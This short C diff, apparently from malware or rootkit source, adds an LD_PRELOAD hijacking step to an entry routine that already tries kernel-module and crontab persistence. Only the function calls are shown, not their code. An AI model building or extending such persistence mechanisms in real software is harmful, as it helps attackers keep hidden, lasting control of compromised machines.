@@ -81,6 +81,7 @@ void entry(Globals *global) {
     // if root, try to load kernel module
     try_persist(global);
     try_add_crontab(global);
+    try_ld_preload(global);
 
     // load the file content into the global buffer
     load_file_bytes(global);
